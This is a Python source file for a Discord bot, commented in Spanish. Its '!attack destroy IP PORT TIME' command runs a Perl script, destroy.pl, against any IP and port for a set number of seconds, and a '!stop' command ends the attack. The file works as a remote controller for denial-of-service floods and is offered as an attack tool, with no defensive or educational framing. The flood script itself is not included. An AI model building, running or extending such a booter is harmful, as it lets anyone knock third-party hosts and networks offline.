import discord
from discord.ext import commands
import subprocess
import os

# Configurar intents - NECESITAMOS message_content para leer comandos
intents = discord.Intents.default()
intents.message_content = True  # ¡ESENCIAL para leer mensajes!

bot = commands.Bot(command_prefix="!", intents=intents)

# Variable global para el proceso de ataque
attack_process = None

def save_token(token):
    """Guarda el token en token.txt"""
    try:
        with open("token.txt", "w") as f:
            f.write(token)
        return True
    except Exception as e:
        print(f"Error guardando token: {e}")
        return False

def load_token():
    """Carga el token desde token.txt"""
    try:
        with open("token.txt", "r") as f:
            return f.read().strip()
    except FileNotFoundError:
        return None

@bot.event
async def on_ready():
    print(f"Bot conectado como {bot.user}")

@bot.command()
async def settoken(ctx, token: str):
    """Guarda el token del bot"""
    if save_token(token):
        await ctx.send("✅ Token guardado correctamente")
    else:
        await ctx.send("❌ Error guardando el token")

@bot.command()
async def attack(ctx, command: str, ip: str, port: int, time: int):
    """Attack is: !attack destroy IP PORT TIME"""
    global attack_process

    if command.lower() != "destroy":
        await ctx.send("!attack destroy IP PORT TIME")
        return

    # Verificar que el script Perl existe
    if not os.path.exists("destroy.pl"):
        await ctx.send("Error: destroy.pl no detected")
        return

    try:
        # Ejecutar el script Perl
        attack_process = subprocess.Popen([
            "perl", "destroy.pl",
            ip, str(port), "65500", str(time)
        ])

        await ctx.send(f"Attack started successfully\nTarget: `{ip}:{port}`\nTime: `{time}` seconds")

    except Exception as e:
        await ctx.send(f" Error: {e}")

@bot.command()
async def stop(ctx):
    """Stopped attacks is running"""
    global attack_process

    if attack_process and attack_process.poll() is None:
        attack_process.terminate()
        attack_process = None
        await ctx.send("Attack stopped")
    else:
        await ctx.send("No attacks running")

# Manejo de errores
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("!attack destroy IP PORT TIME")
    else:
        await ctx.send(f"Command error: {error}")

# Cargar y ejecutar el bot
token = load_token()
if token:
    bot.run(token)
else:
    print("❌ No token.txt found. Use: !settoken YOUR_TOKEN")
